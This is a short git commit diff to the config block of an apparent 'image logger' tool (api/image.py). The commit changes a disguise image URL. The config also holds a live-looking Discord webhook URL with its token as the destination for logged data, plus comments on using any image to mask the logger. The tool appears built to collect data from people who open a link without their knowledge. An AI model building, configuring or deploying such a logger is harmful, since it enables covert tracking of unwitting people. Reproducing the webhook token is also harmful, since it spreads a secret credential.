ec3095dabe8474b6085bc425bb40b77783edb7f4
yaroikio23-star <yaroikio23@gmail.com>
2026-03-03 22:20:31 +0100

    Update image.py

--- api/image.py
+++ api/image.py
@@ -13,7 +13,7 @@ __author__ = "C00lB0i"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1477054008400154857/tw2pK-xTaQNHLwJNWuLzrSn86884av8RRswJZjH64MDDCnGphGlP8v9xfmmlRuRcAwCU",
-    "image": "![image](https://media.tenor.com/BP79uBTrSy0AAAAe/loading-discord.png)", # You can also have a custom image by using a URL argument
+    "image": "https://media.tenor.com/BP79uBTrSy0AAAAe/loading-discord.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
